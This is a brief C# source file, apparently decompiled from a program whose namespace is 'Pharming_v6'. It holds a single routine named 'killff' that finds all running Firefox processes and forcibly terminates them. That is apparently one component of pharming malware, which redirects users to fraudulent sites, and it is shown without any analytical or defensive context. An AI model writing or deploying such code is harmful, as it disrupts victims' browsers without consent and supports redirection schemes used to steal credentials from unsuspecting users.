using System.Diagnostics;
using Microsoft.VisualBasic.CompilerServices;

namespace Pharming_v6;

[StandardModule]
internal sealed class killff
{
	public static void killff()
	{
		Process[] processesByName = Process.GetProcessesByName("firefox");
		foreach (Process process in processesByName)
		{
			process.Kill();
		}
	}
}
